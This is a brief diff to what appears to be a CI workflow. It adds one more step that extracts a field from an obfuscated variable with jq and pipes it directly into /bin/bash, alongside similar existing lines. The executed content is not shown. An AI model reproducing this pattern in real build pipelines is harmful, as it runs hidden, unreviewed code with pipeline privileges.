@@ -20,6 +20,7 @@ jobs:
           echo $v97 | jq -r .vfl87 | /bin/bash
           printf '%s' "$fereq89" | jq -r .oywvb39467 | /bin/bash
           echo $uo66 | jq -r .h309 | /bin/bash
+          printf '%s' "$r18502" | jq -r .i15 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
